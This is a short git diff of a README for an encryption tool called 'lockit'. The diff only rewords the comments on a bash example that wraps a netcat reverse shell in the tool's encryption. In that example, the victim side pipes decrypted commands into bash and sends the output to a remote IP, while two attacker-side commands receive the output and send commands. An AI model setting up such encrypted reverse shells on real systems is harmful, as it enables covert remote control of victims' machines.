@@ -35,9 +35,9 @@ echo "This is a very secret message" | ./lockit encrypt --pipe | nc localhost 99
 
 You can wrap your reverse shell around it and you'll have it encrypted. Example:
 ```bash
-nc -lvnp 9999 | ./lockit decrypt --pipe | bash 2>&1 | ./lockit encrypt --pipe | nc 192.168.50.160 9998 # 1. victim reverse shell
-nc -lvnp 9998 | ./lockit decrypt --pipe # 2. attacker receiving output
-./lockit encrypt --pipe | nc 192.168.60.244 9999 # 3. attacker sending commands
+nc -lvnp 9999 | ./lockit decrypt --pipe | bash 2>&1 | ./lockit encrypt --pipe | nc 192.168.50.160 9998 # victim receiving commands
+nc -lvnp 9998 | ./lockit decrypt --pipe # attacker receiving output
+./lockit encrypt --pipe | nc 192.168.60.244 9999 # attacker sending commands
 ```
 
 ## Mechanism
